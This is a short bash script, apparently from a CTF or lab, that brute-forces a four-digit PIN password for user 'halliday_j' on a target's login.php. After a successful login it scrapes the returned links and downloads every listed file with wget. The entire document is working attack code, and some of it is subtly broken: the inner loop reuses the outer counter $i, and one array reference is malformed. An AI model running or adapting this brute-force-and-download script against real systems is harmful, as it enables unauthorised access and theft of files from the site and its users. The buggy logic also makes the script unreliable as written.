#!/bin/bash

for i in $(seq -w 0000 9999)
do
    connect=$(curl -s --data "login=halliday_j&password=$i" http://$1/login.php | grep "<h1>Identification</h1>" | wc -c)
    if [ "$connect" -eq 0 ]
    then

	nbligne=$(curl --location -s --data "login=halliday_j&password=$i"  http://$1/login.php | grep -o "<a.*/a>" | wc -l)
	nblignes=$(($nbligne-2))
	docu=$(curl --location -s --data "login=halliday_j&password=$i"  http://$1/login.php | grep -o "<a.*/a>" | tail -$nbligne | cut -d '"' -f2)
	tabtxt=( $docu )
	for (( i=1; i<="$nbligne"; i++ ))
	do
	    wget http://$1/files/${tabtxt[$i]}
	    if [ $tabtxt[$i] != 0 ]
	    then
		mv -f ${tabtxt[$i]} out/www
	    fi
	done
	
    fi
done
